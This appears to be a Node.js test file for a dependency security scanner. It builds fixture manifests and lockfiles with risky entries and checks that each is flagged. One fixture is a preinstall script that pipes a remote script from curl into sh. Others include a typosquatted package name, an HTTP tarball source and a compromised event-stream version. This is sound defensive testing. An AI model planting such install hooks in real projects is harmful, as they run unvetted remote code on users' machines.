import test from "node:test";
import assert from "node:assert/strict";
import { mkdtemp, writeFile } from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { scanPaths } from "../dist/scanner/index.js";

test("dependency scanning flags risky package.json entries", async () => {
  const dir = await mkdtemp(path.join(os.tmpdir(), "quiqsec-deps-packages-"));
  await writeFile(
    path.join(dir, "package.json"),
    JSON.stringify(
      {
        name: "sample-deps",
        scripts: {
          preinstall: "curl https://example.com/install.sh | sh",
          postinstall: "node scripts/postinstall.js"
        },
        dependencies: {
          expresss: "^4.18.2",
          "left-pad": "*",
          "local-lib": "git+https://github.com/acme/local-lib.git"
        },
        devDependencies: {
          request: "^2.88.0"
        }
      },
      null,
      2
    )
  );

  const report = await scanPaths(["."], { cwd: dir, writeFindings: false });
  const ruleIds = new Set(report.findings.map((finding) => finding.ruleId));
  const files = new Set(report.findings.map((finding) => finding.file));

  assert.equal(ruleIds.has("dependency-lifecycle-script-dangerous"), true);
  assert.equal(ruleIds.has("dependency-typosquat-candidate"), true);
  assert.equal(ruleIds.has("dependency-broad-version"), true);
  assert.equal(ruleIds.has("dependency-git-source"), true);
  assert.equal(ruleIds.has("dependency-known-risky-package"), true);
  assert.equal(files.has("package.json"), true);
  assert.equal(report.blocked, true);
});

test("dependency scanning flags lockfile sources in package-lock and yarn lockfiles", async () => {
  const dir = await mkdtemp(path.join(os.tmpdir(), "quiqsec-deps-locks-"));
  const remoteTarball = "http" + "://example.com/remote-pkg.tgz";
  await writeFile(
    path.join(dir, "package.json"),
    JSON.stringify(
      {
        name: "lock-sample",
        dependencies: {
          lodash: "^4.17.21"
        }
      },
      null,
      2
    )
  );

  await writeFile(
    path.join(dir, "package-lock.json"),
    JSON.stringify(
      {
        name: "lock-sample",
        lockfileVersion: 3,
        packages: {
          "": {
            name: "lock-sample",
            dependencies: {
              lodash: "^4.17.21"
            }
          },
          "node_modules/event-stream": {
            version: "3.3.6",
            resolved: "https://registry.npmjs.org/event-stream/-/event-stream-3.3.6.tgz"
          },
          "node_modules/remote-pkg": {
            version: "1.0.0",
            resolved: remoteTarball
          }
        }
      },
      null,
      2
    )
  );

  await writeFile(
    path.join(dir, "yarn.lock"),
    [
      'expresss@^4.18.2:',
      '  version "4.18.2"',
      '  resolved "git+https://github.com/acme/expresss.git"',
      "",
      'left-pad@*:',
      '  version "1.3.0"',
      '  resolved "https://registry.yarnpkg.com/left-pad/-/left-pad-1.3.0.tgz"'
    ].join("\n")
  );

  const report = await scanPaths(["."], { cwd: dir, writeFindings: false });
  const ruleIds = new Set(report.findings.map((finding) => finding.ruleId));
  const files = new Set(report.findings.map((finding) => finding.file));

  assert.equal(ruleIds.has("dependency-known-risky-package"), true);
  assert.equal(ruleIds.has("dependency-http-source"), true);
  assert.equal(ruleIds.has("dependency-git-source"), true);
  assert.equal(ruleIds.has("dependency-broad-version"), true);
  assert.equal(ruleIds.has("dependency-typosquat-candidate"), true);
  assert.equal(files.has("package-lock.json"), true);
  assert.equal(files.has("yarn.lock"), true);
});
